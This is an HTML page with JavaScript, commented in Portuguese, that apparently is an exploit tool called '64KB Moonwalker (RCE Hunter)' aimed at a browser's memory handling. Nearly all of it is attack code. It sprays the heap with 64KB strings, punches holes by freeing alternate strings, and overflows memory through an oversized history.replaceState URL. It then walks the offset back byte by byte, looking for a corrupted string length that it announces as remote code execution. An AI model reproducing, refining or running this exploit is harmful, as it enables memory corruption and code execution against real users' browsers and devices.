<!DOCTYPE html>
<html>
<head>
    <title>64KB Moonwalker (RCE Hunter)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-bottom: 20px; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
        .hit { color: yellow; font-weight: bold; }
        .info { color: #aaa; }
    </style>
</head>
<body>

    <h1>64KB Moonwalker</h1>
    <p>Rastreando o cabeçalho Length a partir dos dados confirmados.</p>

    <button onclick="startMoonwalk()">INICIAR RASTREAMENTO REVERSO</button>
    <button onclick="stop()" style="border-color:red; color:red">PARAR</button>
    
    <div id="log">Pronto. Base: 709.520 (Dados Confirmados).</div>

    <script>
        // Começamos onde sabemos que funciona
        let currentOffset = 709520; 
        const OVERFLOW_AMT = 1024 * 64; 

        // Configuração 64KB (Sua descoberta)
        const TARGET_SIZE = 64 * 1024; 
        // Header estimado de string (24 bytes), mas vamos validar
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];
        var isRunning = false;

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : (type === 'hit' ? 'class="hit"' : (type === 'info' ? 'class="info"' : ''));
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function stop() { isRunning = false; log("Parando..."); }

        async function startMoonwalk() {
            if(isRunning) return;
            isRunning = true;
            log("Iniciando Moonwalk com Strings de 64KB...");

            // Limite de segurança para não recuar para sempre
            const LIMIT_OFFSET = 709400; 

            while(isRunning && currentOffset > LIMIT_OFFSET) {
                
                // Limpeza
                victims = [];
                await forceGC();
                await new Promise(r => setTimeout(r, 50));

                try {
                    // 1. SPRAY (64KB Strings)
                    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                    rawBuffer.fill(0x42); // 'B'
                    let decoder = new TextDecoder("utf-8");
                    let baseString = decoder.decode(rawBuffer);

                    // Spray moderado (já que 64KB é leve)
                    for(let i=0; i<400; i++) {
                        let s = i + "_" + baseString.substring((i+"_").length);
                        victims.push(s);
                    }

                    // 2. BURACOS
                    for(let i=0; i<400; i+=2) victims[i] = null;
                    await forceGC();

                    // 3. EXPLOIT
                    let buffer = "A".repeat(currentOffset);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    history.replaceState({}, "moonwalk", "/" + buffer);

                    // 4. CHECAGEM INTELIGENTE
                    let result = checkResult();

                    if (result === "RCE") {
                        isRunning = false;
                        return; // VENCEU!
                    } else if (result === "DATA") {
                        log(`[${currentOffset}] Acertou DADOS. Recuando 1 byte...`, 'hit');
                        currentOffset--; // Recua e tenta de novo
                    } else {
                        // Se falhou (Miss), pode ser azar do alinhamento.
                        // Tentamos o mesmo offset mais uma vez antes de desistir dele?
                        // Ou assumimos que o spray falhou?
                        log(`[${currentOffset}] Erro (Miss). Tentando novamente no mesmo offset...`, 'info');
                        // Não decrementa, tenta de novo
                    }

                } catch(e) {
                    log("Erro crítico: " + e.message);
                    // Se der erro de memória, pausa e tenta de novo
                    await new Promise(r => setTimeout(r, 1000));
                }
            }
        }

        function checkResult() {
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO SUPREMO (Length)
                    if (msg.length !== PAYLOAD_SIZE) {
                        log(`!!! JACKPOT !!! Length Corrompido!`, 'win');
                        log(`OFFSET MÁGICO: ${currentOffset}`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert(`RCE UNLOCKED NO OFFSET ${currentOffset}!`);
                        return "RCE";
                    }

                    // SUCESSO PARCIAL (Dados)
                    if (msg.charCodeAt(0) === 1) {
                        return "DATA";
                    }
                } catch(e) {}
            }
            return "MISS";
        }

        async function forceGC() {
            try { new ArrayBuffer(20 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 100));
        }
    </script>
</body>
</html>
